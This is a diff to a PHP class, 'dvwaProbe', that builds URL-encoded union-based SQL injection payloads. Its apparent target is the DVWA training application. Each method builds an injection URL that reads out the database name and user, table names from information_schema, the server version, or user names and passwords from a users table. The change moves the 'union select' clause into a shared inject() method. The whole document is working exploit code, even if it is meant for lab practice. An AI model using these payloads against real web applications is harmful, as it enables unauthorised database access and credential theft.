@@ -16,7 +16,7 @@ class dvwaProbe
  	 */
 	public function inject()
 	{
-		$insert = '?id=1%27 and 1%3d1 ';
+		$insert = '?id=1%27 and 1%3d1 union select ';
 		return $insert;
 	}
 	
@@ -29,7 +29,7 @@ class dvwaProbe
 	public function getDatabase()
 	{
 		$insert = $this->inject();
-		$injectURL = $this->url . $insert . 'union select database%28%29%2c user%28%29%23&Submit=Submit#';
+		$injectURL = $this->url . $insert . 'database%28%29%2c user%28%29%23&Submit=Submit#';
 		return $injectURL;
 	}
 	
@@ -42,7 +42,7 @@ class dvwaProbe
 	public function getTables()
 	{
 		$insert = $this->inject();
-		$injectURL = $this->url . $insert . 'union select null%2c table_name from information_schema.tables%23&Submit=Submit#';
+		$injectURL = $this->url . $insert . 'null%2c table_name from information_schema.tables%23&Submit=Submit#';
 		return $injectURL;
 	}
 	
@@ -55,7 +55,7 @@ class dvwaProbe
 	public function getUsers()
 	{
 		$insert = $this->inject();
-		$injectURL = $this->url . $insert . 'union select user%2c password from users%23&Submit=Submit#';
+		$injectURL = $this->url . $insert . 'user%2c password from users%23&Submit=Submit#';
 		return $injectURL;
 	}
 	
@@ -68,7 +68,7 @@ class dvwaProbe
 	public function getVersion()
 	{
 		$insert = $this->inject();
-		$injectURL = $this->url . $insert . 'union select null%2c version%28%29%23&Submit=Submit#';
+		$injectURL = $this->url . $insert . 'null%2c version%28%29%23&Submit=Submit#';
 		return $injectURL;
 	}
 }
